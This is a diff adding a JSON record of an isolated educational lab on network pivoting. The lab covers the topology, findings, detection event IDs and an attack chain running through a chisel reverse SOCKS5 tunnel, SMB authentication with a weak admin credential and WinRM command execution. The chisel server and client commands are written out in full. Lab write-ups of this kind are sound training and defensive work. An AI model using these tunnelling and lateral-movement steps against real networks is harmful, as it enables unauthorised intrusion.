@@ -1,0 +1,84 @@
+{
+  "engagement": {
+    "title": "Network Pivoting & Lateral Movement Lab",
+    "type": "isolated-educational-lab",
+    "date": "2026-11-02",
+    "author": "Kashyap Naik",
+    "host": "VirtualBox 7.2.18 on Windows 11 (Intel i3-1215U, 16GB)",
+    "authorized": true,
+    "isolation": "VirtualBox internal networks only; no bridge/NAT to home network or internet during testing"
+  },
+  "topology": {
+    "networks": [
+      { "name": "DMZ-NET", "cidr": "172.16.10.0/24" },
+      { "name": "INTERNAL-NET", "cidr": "10.0.0.0/24" }
+    ],
+    "hosts": [
+      { "name": "KALI-ATTACKER", "role": "attacker", "ips": ["172.16.10.5"], "networks": ["DMZ-NET"] },
+      { "name": "PIVOT01", "os": "Ubuntu 24.04.5", "role": "dual-homed-pivot", "ips": ["172.16.10.15", "10.0.0.15"], "networks": ["DMZ-NET", "INTERNAL-NET"] },
+      { "name": "WIN-TARGET01", "os": "Windows 11 Enterprise LTSC 2024 Eval (Build 26100)", "role": "internal-target", "ips": ["10.0.0.25"], "networks": ["INTERNAL-NET"] }
+    ]
+  },
+  "segmentation_verified": {
+    "kali_to_pivot_dmz": "reachable",
+    "kali_to_windows_direct": "unreachable (Network is unreachable)",
+    "pivot_to_both": "reachable",
+    "windows_to_kali_direct": "unreachable"
+  },
+  "tunnel": {
+    "tool": "chisel",
+    "version": "1.12.0",
+    "type": "reverse SOCKS5",
+    "server": { "host": "KALI-ATTACKER", "cmd": "chisel server -p 8080 --reverse", "listen": "0.0.0.0:8080" },
+    "client": { "host": "PIVOT01", "cmd": "chisel client 172.16.10.5:8080 R:socks" },
+    "socks5_proxy": "127.0.0.1:1080 (on Kali)",
+    "proxychains_config": "socks5 127.0.0.1 1080"
+  },
+  "findings": [
+    {
+      "id": "F1",
+      "title": "Dual-homed host bridges isolated segments",
+      "severity": "high",
+      "detail": "PIVOT01 has interfaces in both DMZ and INTERNAL networks, enabling tunneling between otherwise-isolated segments."
+    },
+    {
+      "id": "F2",
+      "title": "Weak local-administrator credential on internal host",
+      "severity": "critical",
+      "host": "WIN-TARGET01",
+      "account": "labadmin",
+      "detail": "Local administrator account with a weak, guessable password permitted full remote compromise.",
+      "result": "Pwn3d! (administrative access), read/write to C$ and ADMIN$, PowerShell RCE over WinRM"
+    },
+    {
+      "id": "F3",
+      "title": "Management services exposed to untrusted segment",
+      "severity": "high",
+      "host": "WIN-TARGET01",
+      "detail": "SMB (445) and WinRM (5985) reachable from the pivoted attacker via host firewall allow rules."
+    }
+  ],
+  "attack_chain": [
+    "Foothold on dual-homed PIVOT01 (DMZ)",
+    "Chisel reverse SOCKS5 tunnel pivot->attacker (SOCKS on 127.0.0.1:1080)",
+    "proxychains enumeration of INTERNAL-NET (10.0.0.25:445/5985 open)",
+    "NetExec SMB auth as labadmin -> (Pwn3d!) admin",
+    "WinRM remote command execution (whoami=win-target01\\labadmin, hostname=WIN-TARGET01)"
+  ],
+  "detection_event_ids": [4624, 4625, 4648, 4672, 4688, 5140, 5145, 5156],
+  "evidence_screenshots": [
+    "01-windows-target-isolation-proof.png",
+    "02-kali-attacker-isolation-proof.png",
+    "03-pivot-bridge-reaches-both.png",
+    "04-chisel-client-connected.png",
+    "05-chisel-socks5-proxy-listening.png",
+    "06-tunnel-reaches-internal-network.png",
+    "07-lateral-movement-pwned.png",
+    "08-smb-winrm-open-through-tunnel.png",
+    "09-remote-command-execution-rce.png"
+  ],
+  "status": {
+    "completed": ["segmentation", "chisel-tunnel", "proxychains", "internal-enumeration", "lateral-movement", "rce"],
+    "pending": ["packet-analysis", "blue-team-live-detection", "remediation-and-retest", "ssh-pivoting-variants", "python-automation-framework"]
+  }
+}
